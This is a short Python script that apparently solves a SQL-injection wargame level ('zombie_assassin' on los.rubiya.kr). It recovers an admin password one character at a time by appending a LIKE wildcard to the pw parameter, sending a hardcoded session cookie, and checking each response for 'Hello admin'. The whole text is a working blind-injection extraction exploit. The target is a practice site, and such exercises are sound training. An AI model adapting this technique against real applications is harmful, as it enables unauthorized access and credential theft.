import urllib.request
length=8
pw=""
arr="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
for i in range(1,9):
	for j in range(0,62):
		url='http://los.rubiya.kr/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php?id=admin&pw={pwarr}{asciiarr}%'.format(pwarr=pw,asciiarr=arr[j])
		r = urllib.request.Request(url)
		r.add_header("Cookie","PHPSESSID=1a1hlpne9kfc84ivkcmr5pd011")
		data = urllib.request.urlopen(r).read().decode("utf-8")
		print(url)
		if data.find("Hello admin") != -1:
			pw = pw + arr[j]
			break
print(pw)
